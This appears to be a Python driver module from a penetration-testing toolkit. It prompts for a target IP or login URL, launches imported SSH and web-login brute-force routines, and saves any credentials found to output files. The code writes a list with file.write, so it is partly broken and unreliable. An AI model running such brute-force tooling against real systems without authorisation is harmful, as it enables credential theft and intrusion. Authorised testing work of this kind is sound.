import Pentesting.Attack.Scripts.BruteForce_SSH as SSH
import Pentesting.Attack.Scripts.BruteForce_Login as Login
import Pentesting.ModuleTools as Module
import json

ssh_file = "Output/Ssh.txt"
login_file = "Output/Login.txt"
#############################
#                           #
#    Bruteforce Attacks     #
#                           #
#############################


def BruteForce_ssh():
    login = []
    Module.clean()
    Module.line()
    ip = input("Give ip for ssh attack\n--> ")
    Module.clean()
    Module.line()
    print(f"SSH Attack will start on {ip}")
    Module.line()
    SSH.Start_ssh(ip)
    if SSH.GetState() == True:
        user = SSH.GetUser()
        password = SSH.Getpassword()
        login.append(user)
        login.append(password)

        with open(ssh_file, "w") as file:
            file.write(login)
    else:
        with open(ssh_file, "w") as file:
            file.write("No login found")

def BruteForce_login():
    login = []
    Module.clean()
    Module.line()
    url = input("Give login url from website\n--> ")
    Module.clean()
    Module.line()
    print(f"Login bruteforce will start on {url}")
    Module.line()
    Login.Start_login(url)
    if Login.GetState() == True:
        login.append(Login.GetUser())
        login.append(Login.GetPassword())
        with open(login_file, "w") as file:
            file.write(login)
    else:
        with open(login_file, "w") as file:
            file.write("No login found!")